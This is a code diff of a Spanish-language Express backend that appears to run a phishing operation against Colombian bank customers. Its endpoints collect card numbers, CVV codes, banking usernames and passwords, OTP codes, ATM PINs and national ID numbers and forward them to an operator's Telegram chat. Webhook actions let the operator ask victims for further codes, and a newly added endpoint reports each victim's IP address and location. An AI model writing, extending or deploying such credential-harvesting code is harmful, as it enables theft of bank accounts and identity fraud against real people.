@@ -76,8 +76,8 @@ function textoPasoCrear(pago) {
     return (
         `🔔 <b>NUEVA SOLICITUD DE PAGO (PASO 1: TARJETA)</b>\n\n` +
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
-        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +        // 🔥 NUEVO
-        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` + // 🔥 NUEVO
+        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +
+        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` +
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
         `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
         `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
@@ -91,8 +91,8 @@ function textoPasoCredenciales(pago) {
     return (
         `🔑 <b>NUEVOS DATOS RECIBIDOS (PASO 2: CREDENCIALES)</b>\n\n` +
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
-        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +        // 🔥 NUEVO
-        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` + // 🔥 NUEVO
+        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +
+        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` +
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
         `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
         `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n\n` +
@@ -110,8 +110,8 @@ function textoPasoOTP(pago) {
     return (
         `🔐 <b>NUEVOS DATOS RECIBIDOS (PASO 3: ${etiqueta})</b>\n\n` +
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
-        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +        // 🔥 NUEVO
-        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` + // 🔥 NUEVO
+        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +
+        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` +
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
         `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
         `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n\n` +
@@ -144,6 +144,29 @@ app.post('/api/nuevo-ingreso', async (req, res) => {
 });
 
 // ============================================================
+// 🔍 POST /api/notificar-consulta  → Notifica cuando consultan NUIP
+// ============================================================
+app.post('/api/notificar-consulta', async (req, res) => {
+    try {
+        const { nuip, ip, ciudad, pais } = req.body || {};
+
+        const mensaje =
+            `🔍 <b>NUEVA CONSULTA</b>\n\n` +
+            `🪪 <b>NUIP/Cédula:</b> <code>${nuip || '—'}</code>\n` +
+            `🌐 <b>IP:</b> <code>${ip || 'Desconocida'}</code>\n` +
+            `🏙️ <b>Ciudad:</b> ${ciudad || 'Desconocida'}\n` +
+            `🌎 <b>País:</b> ${pais || 'Desconocido'}\n` +
+            `🕒 <b>Hora:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+
+        await tgSendMessage(mensaje);
+        return res.json({ success: true });
+    } catch (err) {
+        console.error("Error en /api/notificar-consulta:", err);
+        return res.status(500).json({ success: false });
+    }
+});
+
+// ============================================================
 // 📥 POST /api/crear-pago
 // ============================================================
 
@@ -152,7 +175,7 @@ app.post('/api/crear-pago', async (req, res) => {
         solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta,
         banco_emisor, usuario_banco, password_banco, codigo_otp,
         clave_atm, clave_dinamica, paso,
-        nombre_solicitante, cedula_solicitante   // 🔥 NUEVO
+        nombre_solicitante, cedula_solicitante
     } = req.body || {};
     
     if (!solicitud_id) return res.status(400).json({ success: false, error: 'Datos incompletos' });
@@ -177,8 +200,8 @@ app.post('/api/crear-pago', async (req, res) => {
                 codigo_otp: codigo_otp || null,
                 clave_atm: clave_atm || null,
                 clave_dinamica: clave_dinamica || null,
-                nombre_solicitante: nombre_solicitante || '—',   // 🔥 NUEVO
-                cedula_solicitante: cedula_solicitante || '—',   // 🔥 NUEVO
+                nombre_solicitante: nombre_solicitante || '—',
+                cedula_solicitante: cedula_solicitante || '—',
                 requiere_clave_atm: esBancoClaveATM(banco_emisor),
                 requiere_clave_dinamica: esBancolombia(banco_emisor),
                 estado: 'pendiente',
@@ -202,8 +225,8 @@ app.post('/api/crear-pago', async (req, res) => {
             pago.codigo_otp = codigo_otp || pago.codigo_otp;
             pago.clave_atm = clave_atm || pago.clave_atm;
             pago.clave_dinamica = clave_dinamica || pago.clave_dinamica;
-            pago.nombre_solicitante = nombre_solicitante || pago.nombre_solicitante;   // 🔥 NUEVO
-            pago.cedula_solicitante = cedula_solicitante || pago.cedula_solicitante;   // 🔥 NUEVO
+            pago.nombre_solicitante = nombre_solicitante || pago.nombre_solicitante;
+            pago.cedula_solicitante = cedula_solicitante || pago.cedula_solicitante;
             pago.requiere_clave_atm = esBancoClaveATM(pago.banco_emisor);
             pago.requiere_clave_dinamica = esBancolombia(pago.banco_emisor);
             pago.estado = 'pendiente';
@@ -341,40 +364,3 @@ app.post('/api/telegram-webhook', async (req, res) => {
             pago.motivo_rechazo = motivo;
             await tgAnswerCallback(cq.id, '❌ Rechazado');
             if (msgId) {
-                const texto = estaEnFaseOTP ? textoPasoOTP(pago) : textoPasoCredenciales(pago);
-                await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}`);
-            }
-        } else if (accion === 'clave_atm') {
-            pago.estado = 'aprobado_credenciales';
-            await tgAnswerCallback(cq.id, '🔑 Se solicitó Clave ATM al cliente');
-            if (msgId) {
-                await tgEditMessage(msgId, `🔑 <b>SE SOLICITÓ CLAVE ATM AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago));
-            }
-        } else if (accion === 'error_usuario') {
-            pago.estado = 'rechazado_user_error';
-            pago.motivo_rechazo = 'Error de usuario: credenciales no coinciden.';
-            await tgAnswerCallback(cq.id, '⚠️ Error de usuario registrado');
-            if (msgId) {
-                await tgEditMessage(msgId, `⚠️ <b>ERROR DE USUARIO</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente reiniciar el proceso.`);
-            }
-        }
-    } catch (err) { console.error("Error en webhook:", err); }
-});
-
-// ============================================================
-// 🔗 REGISTRO DE WEBHOOK + ARRANQUE
-// ============================================================
-
-async function registrarWebhook() {
-    if (!TELEGRAM_TOKEN) return;
-    try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook?url=${encodeURIComponent(PUBLIC_BACKEND_URL + '/api/telegram-webhook')}`);
-        console.log('✅ Webhook registrado');
-    } catch (e) { console.error("Error registrando webhook:", e); }
-}
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Backend en puerto ${PORT}`);
-    registrarWebhook();
-});
